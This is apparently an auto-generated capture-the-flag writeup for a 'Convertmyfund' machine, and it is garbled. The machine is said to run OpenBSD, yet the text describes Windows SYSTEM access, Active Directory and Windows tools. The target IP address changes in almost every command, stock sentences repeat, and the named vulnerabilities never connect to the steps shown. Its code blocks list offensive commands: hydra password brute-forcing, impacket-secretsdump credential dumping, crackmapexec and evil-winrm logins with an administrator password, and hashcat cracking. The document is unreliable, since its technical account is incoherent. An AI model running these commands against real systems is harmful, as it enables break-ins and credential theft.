---
TitleSEO: "PwnTillDawn — Convertmyfund (Medium OpenBSD) | ZureFX"
TitlePost: "PwnTillDawn — Convertmyfund (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Convertmyfund. LXD Privilege Escalation and CORS Misconfiguration to achieve medium compromise on OpenBSD."
Keywords: "easy, tryhackme, hard, linux, medium"
URL: "https://zurefx.github.io/writeups/htb-convertmyfund-137.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-convertmyfund-137/"
Date: "2024-11-10"
Tags: "Easy, TryHackMe, Hard, Linux, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-convertmyfund-137"
Permalink: "/writeups/htb-convertmyfund-137.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Convertmyfund** is rated **Medium** on PwnTillDawn. It runs **OpenBSD** and the IP address during this analysis was `10.58.212.77`.

### Objectives

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p1521,464,464 10.85.182.73 -oN scan.txt
crackmapexec smb 10.55.154.204 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.70.73.1/FUZZ
```

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

### Service Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.20.238.156/FUZZ
```

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

### SMB Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
nmap -sCV -p143,993,5985 10.69.40.240 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.31.30.245/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions.

## Exploitation

### Vulnerability Identification

Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible.

Key finding: **CORS Misconfiguration**.

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

### Initial Access

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.71.38.153 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.83.78.201 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.39.61.178
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.117.108.159 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.40.207.17 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.44.184.28
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.39.65.146 -u administrator -p 'P@ssw0rd!'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Summary

### Tools Used

- `GetUserSPNs`
- `evil-winrm`
- `sharphound`
- `nikto`
- `chisel`
- `lookupsid`

### Key Takeaways

- LXD Privilege Escalation
- CORS Misconfiguration
- Unquoted Service Path
- SeDebugPrivilege
